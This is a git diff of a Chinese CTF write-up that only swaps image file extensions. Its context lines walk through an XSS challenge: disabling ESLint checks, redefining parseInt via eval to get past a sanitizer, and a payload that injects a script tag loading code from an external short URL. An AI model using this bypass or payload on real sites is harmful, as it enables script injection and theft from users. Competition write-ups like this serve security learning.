@@ -231,7 +231,7 @@ flag.push([[0,9],[9,1]]);
 console.log("flag: dice{pr0_duck_gam3r_" + encode(flag) + "}")
 ```
 
-![image](./assets/003.jpg)
+![image](./assets/003.png)
 
 别说控制台还是挺好用
 
@@ -308,15 +308,15 @@ export const sanitize = async (
 
 这个`sanitize.ts`中的限制完全可以当做是没有，
 
-![image](./assets/004.jpg)
+![image](./assets/004.png)
 
 在`project.ts`我们可以知道里面很多**ESLint 规则**(通过预定义的代码模式匹配和逻辑判断)，index有部分黑名单
 
-![image](./assets/005.jpg)
+![image](./assets/005.png)
 
 利用断言语句
 
-![image](./assets/006.jpg)
+![image](./assets/006.png)
 
 但是要知道的是，这些都是警告，如果把警告给关了就可以注入html字符，怎么关呢，利用`/*eslint-disable*/`  [官方文档](https://eslint.org/docs/latest/use/configure/rules)
 
@@ -368,7 +368,7 @@ const comments = (ts.getLeadingCommentRanges(text, 0) ?? [])
 
 意味着我们不能使用注释\断言\以及部分xss符号，这里我们可以用eval，来进行，只不过要绕过类型检测，可以借用函数`parseInt`，还有一个特性，我们可以让其本来是强制转化为int类型的参数，变为字符串类型，payload为`parseInt=str=>str`，进行测试
 
-![image](./assets/007.jpg)
+![image](./assets/007.png)
 
 ```js
 eval("parseInt=str=>str"),parseInt("<scripT src=/"+"/shorturl.at/VhRgx></script>")
@@ -659,5 +659,5 @@ if __name__ == '__main__':
 
 ```
 
-![image](./assets/009.jpg)
+![image](./assets/009.png)
 
